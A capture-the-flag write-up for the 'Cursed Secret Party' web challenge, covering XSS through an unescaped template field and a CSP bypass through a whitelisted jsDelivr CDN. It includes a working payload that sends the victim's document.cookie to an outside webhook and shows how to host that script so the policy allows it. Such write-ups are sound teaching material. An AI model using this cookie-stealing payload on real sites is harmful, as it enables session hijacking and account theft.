# HackTheBoo - Cursed Secret Party

* **Category:** Web
* **Points:** 200
* **Authors:** Xclow3n, Rayhan0x01, Maklaris

## Challenge

> You've just received an invitation to a party. Authorities have reported that the party is cursed, and the guests are trapped in a never-ending unsolvable murder mystery party. Can you investigate further and try to save everyone?

## Solution

![image](https://user-images.githubusercontent.com/78451563/198380053-3137cbf4-09b1-4b9b-84e4-7d3a6e3e13c2.png)

* This looks like a typical xss challenge where we steal the admin's cookie via xss
* The template tag `{{ request.halloween_name |safe }}` is susceptible to xss as `| safe` filter indicates that the value is known to be safe and therefore does not need to be escaped thus returns unescaped HTML to the client.

```node
// ./challenge/index.js
app.use(function (req, res, next) {
    res.setHeader(
        "Content-Security-Policy",
        `script-src 'self' https://cdn.jsdelivr.net ;
        style-src 'self' https://fonts.googleapis.com;
        img-src 'self';
        font-src 'self' https://fonts.gstatic.com;
        child-src 'self';
        frame-src 'self';
        worker-src 'self';
        frame-ancestors 'self';
        form-action 'self';
        base-uri 'self';
        manifest-src 'self'`
    );
    next();
});
```

![image](https://user-images.githubusercontent.com/78451563/198380965-2bd68456-89fb-4457-80b3-3e4130d4aea7.png)

*We are hinted that the challenge will involve something todo with CSP from the name (Cursed Secret Party)(CSP)*
* We can do a quick evaluation of how secure the CSP is using:
[CSP Evaulator](https://csp-evaluator.withgoogle.com/)
* The results show that `script-src` is problematic as the host whitelists can frequently be bypassed and `cdn.jsdelivr.net is known to host JSONP endpoints and Angular libraries which allow to bypass this CSP.`

### Bypassing CSP
```js
//Payload
fetch('https://webhook.site/951a8069-3beb-48d5-a21f-99d73d3c95c7', {
method: 'POST',
mode: 'no-cors',
body: document.cookie
});
```
```
https://github.com/0xEspxrance/CTF-Writeups/blob/main/HackTheBoo/web/xss_poc.js
--> https://www.jsdelivr.com/github -->
https://cdn.jsdelivr.net/gh/0xEspxrance/CTF-Writeups@main/HackTheBoo/web/xss_poc.js
```
![image](https://user-images.githubusercontent.com/78451563/198390669-80770140-5c04-41fa-b236-6df60c761c3a.png)


* We can upload a js file onto our github and convert to a jsdeliver package using [this](https://www.jsdelivr.com/package/npm/csp-bypass) which will bypass CSP as `https://cdn.jsdelivr.net` is whitelisted.
* Then send the payload in the field `halloween_name`

![image](https://user-images.githubusercontent.com/78451563/198391082-7ad9405a-ab45-42a3-88b2-85a7ce0dae10.png)


```
Flag: HTB{cdn_c4n_byp4ss_c5p!!}
```
